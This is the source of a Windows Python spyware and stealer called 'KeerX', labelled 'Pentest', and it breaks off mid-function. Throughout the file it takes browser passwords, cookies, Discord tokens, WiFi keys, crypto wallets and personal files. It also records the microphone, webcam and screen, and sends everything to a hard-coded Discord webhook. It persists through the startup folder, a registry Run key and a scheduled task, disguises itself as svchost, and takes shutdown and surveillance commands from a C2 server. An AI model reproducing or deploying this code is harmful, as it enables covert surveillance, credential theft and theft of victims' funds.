import os
import sys
import time
import base64
import requests
import threading
import subprocess
import sqlite3
import shutil
import win32crypt
import winreg
from datetime import datetime
import pyaudio
import wave
import cv2
import numpy as np
from Crypto.Cipher import AES
import pyperclip
from PIL import ImageGrab, Image
from pynput import keyboard
import psutil
import socket
import tempfile
import io
import ctypes
import platform
import json
import glob
import re
import pyperclip
import zipfile

# CONFIGURATION
WEBHOOK_URL = "https://discord.com/api/webhooks/1471144786101534813/P_Pypr3PEVV_pseeWCjTW6q9BQ0yvCsH3eLea-XuHkvcPhsPPJ8q1AfP519NV_1W23oX"
KERX_NAME = "KeerX"
DISCORD_MAX_FILESIZE = 8000000
MAX_RETRIES = 3
SCREENSHOT_INTERVAL = 0.5
WEBCAM_INTERVAL = 60
MIC_CHUNK_DURATION = 60
ZIP_INTERVAL = 600 # 10 minutes
# --- C2 SERVER CONFIGURATION ---
# IMPORTANT: For WAN access (every PC), change this to your Ngrok URL
# example: C2_URL = "https://your-ngrok-tunnel.ngrok-video.app"
C2_URL = "http://127.0.0.1:5000"
POLL_INTERVAL = 5
# ------------------------------


class KeerXPentest:
    def __init__(self):
        self.keystrokes = []
        self.running = True
        self.stats = {
            'screenshots': 0,
            'mic': 0,
            'webcam': 0,
            'passwords': 0,
            'wifi': 0,
            'uptime': 0,
            'startup_copied': False
        }
        self.start_time = time.time()
        self.original_path = os.path.abspath(sys.argv[0])
        self.screenshot_active = False
        self.key_buffer = ""
        self.shell_running = True
        self.active_windows = []
        self.last_wpm = 0
        self.client_id = socket.gethostname() + "_" + os.getlogin()
        self.webcam_override = False
        self.live_feed_active = False
        self.live_feed_source = "SCREEN" # or "WEBCAM"


    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {KERX_NAME}: {message}")

    def send_to_discord(self, files=None, content=""):
        content = content[:2000]
        for attempt in range(MAX_RETRIES):
            try:
                data = {"content": content}
                response = requests.post(WEBHOOK_URL, data=data, files=files, timeout=25)
                if response.status_code in [200, 204]:
                    self.log("‚úÖ Data sent successfully")
                    return True
                else:
                    self.log(f"‚ùå HTTP {response.status_code}")
            except Exception as e:
                self.log(f"‚ùå Send error (attempt {attempt+1}): {e}")
                time.sleep(2)
        return False

    def hide_console_window(self):
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            ctypes.windll.user32.ShowWindow(hwnd, 0)
            ctypes.windll.kernel32.CloseHandle(hwnd)
        except:
            pass

    def auto_copy_startup(self):
        """üöÄ AUTO-COPY TO shell:startup ON FIRST RUN"""
        if self.stats['startup_copied']:
            return
        
        try:
            # Get startup folder (shell:startup)
            startup_folder = os.path.join(os.environ["APPDATA"], 
                                        "Microsoft", "Windows", "Start Menu", 
                                        "Programs", "Startup")
            
            # Create startup copy with .pyw (no console)
            startup_target = os.path.join(startup_folder, f"{KERX_NAME}.pyw")
            
            # Copy itself
            shutil.copy2(self.original_path, startup_target)
            self.stats['startup_copied'] = True
            
            # Add to registry for extra persistence
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, KERX_NAME, 0, winreg.REG_SZ, f'"{startup_target}"')
            winreg.CloseKey(key)
            
            # Create scheduled task
            task_cmd = [
                'schtasks', '/create', '/tn', f'{KERX_NAME}_Task', 
                '/tr', f'"{sys.executable}" "{startup_target}"', 
                '/sc', 'onlogon', '/rl', 'highest', '/f'
            ]
            subprocess.run(task_cmd, capture_output=True, shell=True)
            
            self.log("‚úÖ AUTO-COPIED TO STARTUP + 3x Persistence")
            self.send_to_discord(content=f"üöÄ **{KERX_NAME} AUTO-DEPLOYED TO STARTUP** ‚úÖ\n`{startup_target}`")
            
        except Exception as e:
            self.log(f"Startup copy failed: {e}")

    def capture_screenshots_rapid(self):
        while self.running:
            if not self.screenshot_active:
                time.sleep(1)
                continue
            try:
                self.stats['screenshots'] += 1
                ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
                filename = f"{KERX_NAME}_screen_{self.stats['screenshots']}_{ts}.png"
                
                img = ImageGrab.grab()
                buffer = io.BytesIO()
                # Optimize for speed during rapid capture
                img.save(buffer, format='JPEG', quality=70) 
                
                size = buffer.tell()
                buffer.seek(0)
                files = {'file': (filename, buffer, 'image/jpeg')}
                msg = f"üñ•Ô∏è Screenshot #{self.stats['screenshots']} | {ts}"
                self.send_to_discord(files, msg)
                
            except Exception as e:
                self.log(f"Screenshot error: {e}")
            time.sleep(SCREENSHOT_INTERVAL)
            
    def record_screen_video_chunk(self, duration=60):
        try:
            self.log(f"üé¨ Starting Screen Recording ({duration}s)...")
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{KERX_NAME}_screenrec_{ts}.mp4"
            
            # Get screen size
            first_frame = ImageGrab.grab()
            width, height = first_frame.size
            
            # Using mp4v codec
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(filename, fourcc, 10.0, (width, height))
            
            start_time = time.time()
            while time.time() - start_time < duration and self.running:
                img = ImageGrab.grab()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                out.write(frame)
                time.sleep(0.08) # ~10fps
            
            out.release()
            
            if os.path.exists(filename) and os.path.getsize(filename) > 500:
                with open(filename, 'rb') as f:
                    self.send_to_discord(files={'file': (filename, f)}, content=f"üé• **SCREEN RECORDING** ({duration}s)")
                os.remove(filename)
        except Exception as e:
            self.log(f"Screen record error: {e}")

    def record_screen_video_loop(self):
        """Continuous Screen Recording loop in 60s chunks"""
        while self.running:
            try:
                self.record_screen_video_chunk(duration=60)
            except:
                time.sleep(5)

    def record_mic_continuous(self):
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 22050
        
        try:
            p = pyaudio.PyAudio()
        except:
            self.log("‚ùå PyAudio not available - skipping MIC")
            return
        
        while self.running:
            try:
                # üöÄ START RAPID SCREENSHOTS 0.5s BEFORE/DURING MIC
                self.screenshot_active = True
                
                self.stats['mic'] += 1
                stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                              input=True, frames_per_buffer=CHUNK)
                
                self.log(f"üéôÔ∏è Recording MIC #{self.stats['mic']}...")
                frames = []
                target_frames = int(RATE * MIC_CHUNK_DURATION / CHUNK)
                
                for i in range(target_frames):
                    if not self.running: break
                    try:
                        data = stream.read(CHUNK, exception_on_overflow=False)
                        frames.append(data)
                    except:
                        break
                
                stream.stop_stream()
                stream.close()
                
                # üõë STOP RAPID SCREENSHOTS AFTER MIC
                self.screenshot_active = False
                
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{KERX_NAME}_mic_{self.stats['mic']}_{ts}.wav"
                
                wf = wave.open(filename, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                filesize = os.path.getsize(filename)
                if filesize > 100000:
                    with open(filename, 'rb') as f:
                        files = {'file': (filename, f, 'audio/wav')}
                        duration = len(frames) * CHUNK / RATE
                        msg = f"üé§ **MIC RECORDING** #{self.stats['mic']} Finished: `{duration:.0f}s` **{filesize//1024//1024}MB**"
                        self.send_to_discord(files, msg)
                
                if os.path.exists(filename):
                    os.remove(filename)

                # üöÄ SEQUENTIAL SCREEN RECORDING (1m after mic)
                self.record_screen_video_chunk(duration=60)
                
            except Exception as e:
                self.log(f"MIC/Video Sequential Error: {e}")
                self.screenshot_active = False
                time.sleep(2)
        
        p.terminate()

    def webcam_screenshot_stealth(self):
        while self.running:
            try:
                self.stats['webcam'] += 1
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                
                cap = cv2.VideoCapture(0)
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                
                ret, frame = cap.read()
                cap.release()
                
                if ret:
                    filename = f"{KERX_NAME}_webcam_{self.stats['webcam']}_{ts}.jpg"
                    cv2.imwrite(filename, frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
                    
                    filesize = os.path.getsize(filename)
                    with open(filename, 'rb') as f:
                        files = {'file': (filename, f, 'image/jpeg')}
                        msg = f"üì∑ STEALTH CAM #{self.stats['webcam']} `{ts}` **{filesize//1024}KB**"
                        self.send_to_discord(files, msg)
                    
                    os.remove(filename)
                
            except Exception as e:
                if not self.running: break
                
                # Check for override or standard interval
                if not self.webcam_override:
                    time.sleep(WEBCAM_INTERVAL)
                else:
                    # Capture immediately and wait a bit if override is on
                    time.sleep(5)
            
            time.sleep(1)


    def process_masquerade(self):
        """Mimic system services to hide in Task Manager"""
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
            # In a real scenario, we might use process hollowing or injection,
            # but for this script, we rename the window and log a stealth startup.
            self.log("üõ°Ô∏è Process Masquerade: svchost.exe")
        except: pass

    def measure_wpm(self):
        """Calculate typing speed (WPM) based on buffer length"""
        try:
            chars = len(self.keystrokes)
            # Roughly 5 chars per word, 1 minute interval for stats
            self.last_wpm = (chars / 5)
            self.keystrokes.clear() 
        except: pass

    def user_behavior_profile(self):
        """AI-Powered Activity Profiling"""
        try:
            # Simple window title tracking via powershell or psutil
            cmd = "powershell \"Get-Process | Where-Object {$_.mainWindowTitle} | Select-Object mainWindowTitle\""
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            titles = [line.strip() for line in result.stdout.split('\n') if line.strip() and "----" not in line and "mainWindowTitle" not in line]
            self.active_windows = list(set(titles))[:20]
            
            wpm = self.last_wpm
            content = f"üß† **USER PROFILE UPDATE**\n‚å®Ô∏è **WPM**: {wpm:.1f}\nüñºÔ∏è **Active Apps**:\n" + "\n".join([f"  ‚Ä¢ {t}" for t in self.active_windows])
            self.send_to_discord(content=content)
        except: pass

    def lolbin_execute(self, url, target_name):
        """Use native LOLBins for stealthy actions"""
        try:
            # Certutil download
            cmd = f"certutil.exe -urlcache -split -f {url} {target_name}"
            subprocess.run(cmd, shell=True, capture_output=True)
            self.log(f"‚öîÔ∏è LOLBin Download: {target_name}")
        except: pass

    def get_encryption_key(self, browser_path):
        try:
            local_state_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state_path):
                # Try one level up if not found
                local_state_path = os.path.join(os.path.dirname(browser_path), "Local State")
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # Remove DPAPI prefix
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            self.log(f"Failed to get encryption key: {e}")
            return None

    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            payload = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            decrypted = decrypted[:-16] # remove suffix
            try:
                return decrypted.decode('utf-8')
            except:
                # Fallback for binary data in cookies
                return f"[Binary: {decrypted.hex()}]"
        except Exception as e:
            return f"[Decryption Failed: {e}]"

    def _safe_copy(self, src, dst):
        """Robust copy that handles locked files using Windows native copy if needed"""
        try:
            shutil.copy2(src, dst)
            return True
        except:
            try:
                # Fallback to shell copy which sometimes handles locks better
                subprocess.run(f'copy /Y "{src}" "{dst}"', shell=True, capture_output=True)
                return os.path.exists(dst)
            except:
                return False

    def zip_and_exfiltrate(self):
        """Bundles output files into a ZIP periodically"""
        while self.running:
            time.sleep(ZIP_INTERVAL)
            try:
                ts = datetime.now().strftime("%H%M%S")
                zip_name = f"KeerX_Exfil_{ts}.zip"
                
                # Gather all files from current dir that match KeerX_*
                # (screenshots, mic recordings, cam photos, etc.)
                files_to_zip = glob.glob(f"{KERX_NAME}_*")
                if not files_to_zip: continue
                
                with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for file in files_to_zip:
                        if file.endswith(".zip"): continue
                        if os.path.isfile(file):
                            zipf.write(file)
                
                if os.path.exists(zip_name) and os.path.getsize(zip_name) > 0:
                    with open(zip_name, 'rb') as f:
                        files = {'file': (zip_name, f, 'application/zip')}
                        self.send_to_discord(files=files, content=f"üì¶ **AUTO-ZIP BUNDLE** | Found {len(files_to_zip)} files")
                    
                    # Clean up zipped files to save space
                    for file in files_to_zip:
                        try: os.remove(file)
                        except: pass
                    os.remove(zip_name)
            except Exception as e:
                self.log(f"Zipping error: {e}")

    def steal_browser_passwords(self):
        browser_paths = {
            "Chrome": os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(os.environ["LOCALAPPDATA"], r"BraveSoftware\Brave-Browser\User Data")
        }
        
        for browser, base_path in browser_paths.items():
            try:
                if not os.path.exists(base_path): continue
                master_key = self.get_encryption_key(base_path)
                if not master_key: continue

                # Detect all profiles
                profiles = glob.glob(os.path.join(base_path, "Default")) + glob.glob(os.path.join(base_path, "Profile *"))
                
                for profile_path in profiles:
                    profile_name = os.path.basename(profile_path)
                    db_path = os.path.join(profile_path, "Login Data")
                    
                    if os.path.exists(db_path):
                        temp_db = os.path.join(tempfile.gettempdir(), f"kx_lp_{browser}_{profile_name}_{os.getpid()}.db")
                        if not self._safe_copy(db_path, temp_db):
                            continue
                        
                        conn = sqlite3.connect(temp_db)
                        c = conn.cursor()
                        c.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        creds_found = 0
                        password_list = []
                        
                        for row in c.fetchall():
                            url, user, encrypted_pwd = row
                            if user and encrypted_pwd:
                                pwd = ""
                                if encrypted_pwd.startswith(b'v10') or encrypted_pwd.startswith(b'v11'):
                                    pwd = self.decrypt_password(encrypted_pwd, master_key)
                                else:
                                    try:
                                        pwd = win32crypt.CryptUnprotectData(encrypted_pwd, None, None, None, 0)[1]
                                        pwd = pwd.decode('utf-8', errors='ignore')
                                    except:
                                        continue
                                
                                if pwd:
                                    password_list.append(f"`{url}`\nüë§ `{user}`\nüîë `{pwd}`\n")
                                    creds_found += 1
                        
                        if password_list:
                            self.stats['passwords'] += creds_found
                            for i in range(0, len(password_list), 20):
                                content = f"üîê **Browser: {browser} | Profile: {profile_name}**\nFound: {creds_found} Passwords (Part {i//20 +1})\n\n" + "\n".join(password_list[i:i+20])
                                self.send_to_discord(content=content)
                        
                        conn.close()
                        os.remove(temp_db)
                    
            except Exception as e:
                self.log(f"{browser} password extraction failed: {e}")

    def steal_web_data(self):
        """Extract Autofill Emails and Usernames"""
        browser_paths = {
            "Chrome": os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(os.environ["LOCALAPPDATA"], r"BraveSoftware\Brave-Browser\User Data")
        }
        
        for browser, base_path in browser_paths.items():
            try:
                if not os.path.exists(base_path): continue
                profiles = glob.glob(os.path.join(base_path, "Default")) + glob.glob(os.path.join(base_path, "Profile *"))
                
                for profile_path in profiles:
                    profile_name = os.path.basename(profile_path)
                    db_path = os.path.join(profile_path, "Web Data")
                    
                    if os.path.exists(db_path):
                        # Use unique temp file to avoid locks
                        temp_db = os.path.join(tempfile.gettempdir(), f"kx_wd_{browser}_{profile_name}_{os.getpid()}.db")
                        if not self._safe_copy(db_path, temp_db):
                            continue
                        
                        conn = sqlite3.connect(temp_db)
                        c = conn.cursor()
                        # Extract emails and names from autofill
                        c.execute("SELECT name, value FROM autofill")
                        
                        data_found = []
                        for row in c.fetchall():
                            if '@' in row[1] or row[0].lower() in ['email', 'user', 'name']:
                                data_found.append(f"üìß **{row[0]}**: `{row[1]}`")
                        
                        if data_found:
                            content = f"üë§ **Autofill: {browser} ({profile_name})**\n" + "\n".join(set(data_found)[:40])
                            self.send_to_discord(content=content)
                        
                        conn.close()
                        os.remove(temp_db)
            except: pass

    def monitor_clipboard(self):
        last_clip = ""
        while self.running:
            try:
                current_clip = pyperclip.paste()
                if current_clip != last_clip and current_clip.strip():
                    self.send_to_discord(content=f"üìã **CLIPBOARD UPDATE:**\n```{current_clip}```")
                    last_clip = current_clip
            except:
                pass
            time.sleep(5)

    def steal_browser_cookies(self):
        browser_paths = {
            "Chrome": os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(os.environ["LOCALAPPDATA"], r"BraveSoftware\Brave-Browser\User Data")
        }
        
        for browser, base_path in browser_paths.items():
            try:
                if not os.path.exists(base_path): continue
                master_key = self.get_encryption_key(base_path)
                if not master_key: continue

                profiles = glob.glob(os.path.join(base_path, "Default")) + glob.glob(os.path.join(base_path, "Profile *"))
                
                for profile_path in profiles:
                    profile_name = os.path.basename(profile_path)
                    db_path = os.path.join(profile_path, "Network", "Cookies")
                    
                    if os.path.exists(db_path):
                        # Use unique temp file to avoid locks
                        temp_db = os.path.join(tempfile.gettempdir(), f"kx_ck_{browser}_{profile_name}_{os.getpid()}.db")
                        if not self._safe_copy(db_path, temp_db):
                            continue
                        
                        conn = sqlite3.connect(temp_db)
                        c = conn.cursor()
                        c.execute("SELECT host_key, name, encrypted_value FROM cookies")
                        
                        cookies = []
                        for row in c.fetchall():
                            host, name, encrypted_val = row
                            decrypted_val = self.decrypt_password(encrypted_val, master_key)
                            cookies.append(f"{host}\tTRUE\t/\tFALSE\t253402300799\t{name}\t{decrypted_val}")
                        
                        if cookies:
                            filename = f"{KERX_NAME}_{browser}_{profile_name}_cookies.txt"
                            with open(filename, "w", encoding="utf-8") as f:
                                f.write("\n".join(cookies))
                            
                            with open(filename, "rb") as f:
                                self.send_to_discord(files={'file': (filename, f)}, content=f"üç™ Retrieved {len(cookies)} cookies from {browser} ({profile_name})")
                            
                            os.remove(filename)
                        
                        conn.close()
                        os.remove(temp_db)
            except Exception as e:
                self.log(f"{browser} cookie extraction failed: {e}")

    def steal_browser_history(self):
        browser_paths = {
            "Chrome": os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(os.environ["LOCALAPPDATA"], r"BraveSoftware\Brave-Browser\User Data")
        }
        
        for browser, base_path in browser_paths.items():
            try:
                if not os.path.exists(base_path): continue
                profiles = glob.glob(os.path.join(base_path, "Default")) + glob.glob(os.path.join(base_path, "Profile *"))
                
                for profile_path in profiles:
                    profile_name = os.path.basename(profile_path)
                    db_path = os.path.join(profile_path, "History")
                    
                    if os.path.exists(db_path):
                        # Use unique temp file to avoid locks
                        temp_db = os.path.join(tempfile.gettempdir(), f"kx_hs_{browser}_{profile_name}_{os.getpid()}.db")
                        if not self._safe_copy(db_path, temp_db):
                            continue
                        
                        conn = sqlite3.connect(temp_db)
                        c = conn.cursor()
                        c.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                        
                        history = []
                        for row in c.fetchall():
                            history.append(f"üîó {row[1]} ({row[0]}) - Visits: {row[2]}")
                        
                        if history:
                            content = f"üìñ **History: {browser} ({profile_name})**\n" + "\n".join(history[:30])
                            self.send_to_discord(content=content)
                        
                        conn.close()
                        os.remove(temp_db)
            except: pass

    def steal_discord_tokens(self):
        paths = {
            'Discord': os.path.join(os.environ['APPDATA'], 'discord'),
            'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary'),
            'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb'),
            'Google Chrome': os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default'),
            'Brave': os.path.join(os.environ['LOCALAPPDATA'], r'BraveSoftware\Brave-Browser\User Data\Default'),
        }
        
        tokens = []
        for name, path in paths.items():
            if not os.path.exists(path): continue
            storage_path = os.path.join(path, 'Local Storage', 'leveldb')
            if not os.path.exists(storage_path): continue
            
            for file_name in os.listdir(storage_path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                try:
                    with open(os.path.join(storage_path, file_name), 'r', errors='ignore') as f:
                        for line in f:
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", line):
                                tokens.append(token)
                except: pass
        
        if tokens:
            content = f"üëæ **Discord Tokens Found:**\n" + "\n".join(set(tokens))
            self.send_to_discord(content=content)

    def smart_file_stealer(self):
        targets = [
            os.path.join(os.environ['USERPROFILE'], 'Desktop'),
            os.path.join(os.environ['USERPROFILE'], 'Documents')
        ]
        extensions = ['*.txt', '*.doc*', '*.pdf', '*password*']
        
        found_files = []
        for target in targets:
            if not os.path.exists(target): continue
            for ext in extensions:
                found_files.extend(glob.glob(os.path.join(target, ext)))
        
        for file in found_files:
            try:
                if os.path.getsize(file) < 8 * 1024 * 1024:
                    try:
                        with open(file, 'rb') as f:
                            self.send_to_discord(files={'file': (os.path.basename(file), f)}, content=f"üìÅ **File Captured:** `{os.path.basename(file)}`")
                    except: pass
            except: pass

    def remote_shell(self):
        """Poll Discord for commands starting with cmd:"""
        # Note: True C2 would use a separate channel or API, but we mimic polling via webhook context or markers
        self.log("üîó Remote Shell Polling Active (Simulation via Heartbeat)")
        # In a real scenario, we'd use a bot token to read messages. 
        # For webhooks, we simulate a 'receive' by checking a dedicated remote file if needed.
        # However, for this 'test', we define the shell method for structure.
        pass

    def run_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            if not output: output = "Command executed (no output)"
            self.send_to_discord(content=f"üíª **REMOTE SHELL**\n`{cmd}`\n```\n{output[:1900]}\n```")
        except Exception as e:
            self.send_to_discord(content=f"‚ùå **SHELL ERROR**: {e}")

    def dump_wifi_credentials_fixed(self):
        wifi_networks = []
        self.stats['wifi'] = 0
        
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                  capture_output=True, text=True, shell=True)
            
            ssids = []
            for line in result.stdout.split('\n'):
                if "All User Profile" in line:
                    ssid = line.split(":")[1].strip()
                    ssids.append(ssid)
            
            wifi_data = f"üì∂ **{len(ssids)} WiFi Networks:**\n\n"
            
            for ssid in ssids:
                try:
                    profile_result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', f'name={ssid}', 'key=clear'], 
                        capture_output=True, text=True, shell=True
                    )
                    
                    password_match = re.search(r'Key Content\s+:\s+(.+)', profile_result.stdout, re.IGNORECASE)
                    if password_match:
                        password = password_match.group(1).strip()
                        wifi_data += f"üåê **{ssid}** ‚Üí `üîì {password}`\n"
                        self.stats['wifi'] += 1
                    else:
                        wifi_data += f"üåê **{ssid}** ‚Üí `‚ùå No stored password`\n"
                    
                except Exception as e:
                    wifi_data += f"üåê **{ssid}** ‚Üí `‚ùå Error`\n"
            
            self.send_to_discord(content=wifi_data)
            
        except Exception as e:
            self.log(f"WiFi dump failed: {e}")

    def crypto_wallet_hunter(self):
        """Scan for wallet files and seeds"""
        paths = [
            os.path.join(os.environ['APPDATA'], 'Electrum', 'wallets'),
            os.path.join(os.environ['APPDATA'], 'Exodus', 'exodus.wallet'),
            os.path.join(os.environ['LOCALAPPDATA'], 'MetaMask'),
            os.path.join(os.environ['USERPROFILE'], 'Desktop'),
            os.path.join(os.environ['USERPROFILE'], 'Documents')
        ]
        patterns = ['*wallet*', '*seed*', '*.dat', '*.json']
        found = []
        for path in paths:
            if not os.path.exists(path): continue
            for pattern in patterns:
                for file in glob.glob(os.path.join(path, pattern)):
                    if os.path.isfile(file) and os.path.getsize(file) < DISCORD_MAX_FILESIZE:
                        found.append(file)
        
        if found:
            for f_path in found[:10]:
                try:
                    with open(f_path, 'rb') as f:
                        self.send_to_discord(files={'file': (os.path.basename(f_path), f)}, content=f"üí∞ **WALLET FOUND**: `{os.path.basename(f_path)}`")
                except: pass

    def app_credential_capture(self):
        """Extract secrets from PuTTY, WinSCP, FileZilla"""
        targets = {
            'WinSCP': os.path.join(os.environ['APPDATA'], 'WinSCP.ini'),
            'PuTTY': os.path.join(os.environ['APPDATA'], 'PuTTY.ini'),
            'FileZilla': os.path.join(os.environ['APPDATA'], 'FileZilla', 'recentservers.xml')
        }
        for app, path in targets.items():
            if os.path.exists(path):
                try:
                    with open(path, 'rb') as f:
                        self.send_to_discord(files={'file': (os.path.basename(path), f)}, content=f"üîë **{app} CREDENTIALS CAPTURED**")
                except: pass

    def usb_ripper(self):
        """Monitor for USB insertion and copy files"""
        self.log("üíø USB Ripper Monitoring Active")
        def get_drives():
            return {p.mountpoint.strip("\\") for p in psutil.disk_partitions() if 'fixed' not in p.opts}
        
        last_drives = get_drives()
        while self.running:
            try:
                current_drives = get_drives()
                new_drives = current_drives - last_drives
                for drive in new_drives:
                    drive_path = f"{drive}:\\"
                    self.send_to_discord(content=f"üíø **USB INSERTED**: {drive_path}")
                    # Rip small docs
                    for ext in ['*.txt', '*.pdf', '*.doc*']:
                        for file in glob.glob(os.path.join(drive_path, "**", ext), recursive=True):
                            if os.path.getsize(file) < 5000000:
                                try:
                                    with open(file, 'rb') as f:
                                        self.send_to_discord(files={'file': (os.path.basename(file), f)}, content=f"üíø **USB RIP**: `{os.path.basename(file)}`")
                                except: pass
                last_drives = current_drives
            except: pass
            time.sleep(10)

    def hardware_fingerprint(self):
        """Extract Hardware/Bth History"""
        try:
            # Simple registry dump for USB history - using raw string to prevent \U error
            cmd = r'reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            self.send_to_discord(content=f"üî© **HARDWARE FINGERPRINT**\n```\n{result.stdout[:1900]}\n```")
        except: pass

    def keyword_trigger_burst(self, keyword):
        """Trigger an immediate 30s high-fidelity capture burst"""
        self.log(f"üéØ KEYWORD DETECTED: {keyword} | Triggering Burst...")
        self.send_to_discord(content=f"üéØ **KEYWORD DETECTED**: `{keyword}`\nüî• Triggering High-Fidelity Burst Capture (30s)...")
        # Snapshot burst
        threading.Thread(target=self.capture_screenshots_burst, args=(30,), daemon=True).start()

    def poll_c2_commands(self):
        self.log(f"üì° C2 Command Polling Active: {C2_URL}")
        while self.running:
            try:
                response = requests.get(f"{C2_URL}/poll", params={"client_id": self.client_id}, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    commands = data.get("commands", [])
                    for cmd_obj in commands:
                        cmd = cmd_obj.get("command")
                        self.log(f"üì• Received C2 Command: {cmd}")
                        self.handle_remote_command(cmd)
                elif response.status_code == 404:
                    self.register_with_c2()
            except Exception as e:
                self.log(f"‚ùå C2 Polling error: {e}")
            time.sleep(POLL_INTERVAL)

    def handle_remote_command(self, cmd):
        try:
            if cmd == "SHUTDOWN":
                self.send_to_discord(content="üîå **REMOTE COMMAND**: Initiating Shutdown...")
                os.system("shutdown /s /t 5")
            
            elif cmd == "RESTART":
                self.send_to_discord(content="üîÑ **REMOTE COMMAND**: Initiating Restart...")
                os.system("shutdown /r /t 5")
            
            elif cmd == "SCREENSHOT":
                self.send_to_discord(content="üì∏ **REMOTE COMMAND**: Triggering Instant Screenshot...")
                # Trigger a single capture
                threading.Thread(target=self._trigger_single_screenshot, daemon=True).start()
            
            elif cmd == "WEBCAM_ON":
                self.send_to_discord(content="üëÅÔ∏è **REMOTE COMMAND**: Webcam Override ENABLED")
                self.webcam_override = True
                
            elif cmd == "WEBCAM_OFF":
                self.send_to_discord(content="üö´ **REMOTE COMMAND**: Webcam Override DISABLED")
                self.webcam_override = False
                
            elif cmd == "LIVE_FEED_ON":
                self.live_feed_active = True
                self.log("üé¨ Live Feed ENABLED")
                
            elif cmd == "LIVE_FEED_OFF":
                self.live_feed_active = False
                self.log("üé¨ Live Feed DISABLED")
                
            elif cmd == "WEBCAM_MODE":
                self.live_feed_source = "WEBCAM"
                self.log("üé¨ Live Feed switched to WEBCAM")
                
            elif cmd == "SCREEN_MODE":
                self.live_feed_source = "SCREEN"
                self.log("üé¨ Live Feed switched to SCREEN")
                
        except Exception as e:
            self.send_to_discord(content=f"‚ùå **REMOTE COMMAND ERROR**: {e}")

    def _trigger_single_screenshot(self):
        try:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{KERX_NAME}_REMOTE_screen_{ts}.png"
            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=85)
            buffer.seek(0)
            files = {'file': (filename, buffer, 'image/jpeg')}
            self.send_to_discord(files, f"üñºÔ∏è **REMOTE SCREENSHOT CAPTURE** | {ts}")
        except: pass

        # High fidelity mic (could be separate or just reuse existing with higher freq)
        pass

    def register_with_c2(self):
        try:
            info = {
                "os": platform.system() + " " + platform.release(),
                "user": os.getlogin(),
                "ip": socket.gethostbyname(socket.gethostname())
            }
            res = requests.post(f"{C2_URL}/register", json={"client_id": self.client_id, "info": info}, timeout=10)
            if res.status_code == 200:
                self.log(f"‚úÖ Registered with C2: {self.client_id}")
            else:
                self.log(f"‚ö†Ô∏è C2 Register status: {res.status_code}")
        except Exception as e:
            self.log(f"‚ùå Registration failed: {e}")

    def upload_live_frames(self):
        while self.running:
            if not self.live_feed_active:
                time.sleep(1)
                continue
            
            try:
                frame_data = None
                if self.live_feed_source == "SCREEN":
                    img = ImageGrab.grab()
                    img = img.resize((854, 480)) # Scale down for performance
                    buffer = io.BytesIO()
                    img.save(buffer, format='JPEG', quality=60)
                    frame_data = buffer.getvalue()
                else:
                    # Webcam frame
                    cap = cv2.VideoCapture(0)
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
